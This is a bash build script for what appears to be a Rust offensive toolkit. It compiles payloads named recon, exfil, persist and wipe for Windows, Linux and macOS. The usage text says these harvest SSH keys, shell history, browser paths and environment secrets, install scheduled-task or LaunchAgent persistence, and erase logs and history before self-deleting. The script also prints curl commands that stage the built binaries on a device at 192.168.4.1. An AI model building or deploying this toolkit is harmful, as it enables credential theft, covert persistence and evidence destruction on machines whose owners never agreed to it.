#!/usr/bin/env bash
set -euo pipefail

PAYLOAD="${1:-}"
TARGET_PLATFORM="${2:-native}"

usage() {
    echo "Usage: ./build.sh <payload> [native|windows|linux|macos]"
    echo ""
    echo "Payloads:"
    echo "  recon    Full system audit (processes, network, WiFi, software, secrets)"
    echo "  exfil    File exfiltration (SSH keys, shell history, browser paths, env secrets)"
    echo "  persist  Install persistence (schtasks / LaunchAgent / crontab)"
    echo "  wipe     Clear traces and self-delete (history, logs)"
    echo ""
    echo "Platforms:"
    echo "  native   Current machine (default)"
    echo "  windows  x86_64-pc-windows-gnu  — needs: brew install mingw-w64"
    echo "  linux    x86_64-unknown-linux-musl — needs: brew install filosottile/musl-cross/musl-cross"
    echo "  macos    aarch64-apple-darwin (native on Apple Silicon, no extras needed)"
}

die() { echo "error: $*" >&2; exit 1; }

# Ensure a Rust target is installed, installing it if missing.
ensure_target() {
    local target="$1"
    if ! rustup target list --installed 2>/dev/null | grep -qx "$target"; then
        echo "Installing Rust target $target ..."
        rustup target add "$target"
    fi
}

# Check that a cross-linker binary exists; print install instructions and exit if not.
require_linker() {
    local binary="$1"
    local install_hint="$2"
    if ! command -v "$binary" &>/dev/null; then
        echo ""
        echo "Missing cross-linker: $binary"
        echo "Install it with:"
        echo "  $install_hint"
        echo ""
        exit 1
    fi
}

if [[ -z "$PAYLOAD" ]]; then
    usage
    exit 1
fi

case "$PAYLOAD" in
    recon|exfil|persist|wipe) ;;
    *) echo "Unknown payload: $PAYLOAD"; usage; exit 1 ;;
esac

EXTRA_FLAGS=""
if [[ "$PAYLOAD" == "recon" ]]; then
    EXTRA_FLAGS="--features with-sysinfo"
fi

case "$TARGET_PLATFORM" in
    native)
        cargo build --release --bin "$PAYLOAD" $EXTRA_FLAGS
        echo "Built: target/release/$PAYLOAD"
        ;;

    windows)
        RUST_TARGET="x86_64-pc-windows-gnu"
        require_linker "x86_64-w64-mingw32-gcc" "brew install mingw-w64"
        ensure_target "$RUST_TARGET"
        cargo build --release --bin "$PAYLOAD" $EXTRA_FLAGS --target "$RUST_TARGET"
        OUT="target/$RUST_TARGET/release/$PAYLOAD.exe"
        echo "Built: $OUT"
        echo ""
        echo "Upload via portal — or stage manually:"
        echo "  curl -X POST http://192.168.4.1/api/upload_binary \\"
        echo "       -H 'x-filename: $PAYLOAD.exe' \\"
        echo "       --data-binary @$OUT"
        ;;

    linux)
        RUST_TARGET="x86_64-unknown-linux-musl"
        require_linker "x86_64-linux-musl-gcc" \
            "brew install filosottile/musl-cross/musl-cross"
        ensure_target "$RUST_TARGET"
        cargo build --release --bin "$PAYLOAD" $EXTRA_FLAGS --target "$RUST_TARGET"
        OUT="target/$RUST_TARGET/release/$PAYLOAD"
        echo "Built: $OUT"
        echo ""
        echo "Upload via portal — or stage manually:"
        echo "  curl -X POST http://192.168.4.1/api/upload_binary \\"
        echo "       -H 'x-filename: $PAYLOAD-linux' \\"
        echo "       --data-binary @$OUT"
        ;;

    macos)
        RUST_TARGET="aarch64-apple-darwin"
        ensure_target "$RUST_TARGET"
        cargo build --release --bin "$PAYLOAD" $EXTRA_FLAGS --target "$RUST_TARGET"
        OUT="target/$RUST_TARGET/release/$PAYLOAD"
        echo "Built: $OUT"
        echo ""
        echo "Upload via portal — or stage manually:"
        echo "  curl -X POST http://192.168.4.1/api/upload_binary \\"
        echo "       -H 'x-filename: $PAYLOAD-mac' \\"
        echo "       --data-binary @$OUT"
        ;;

    *)
        echo "Unknown platform: $TARGET_PLATFORM"
        usage
        exit 1
        ;;
esac
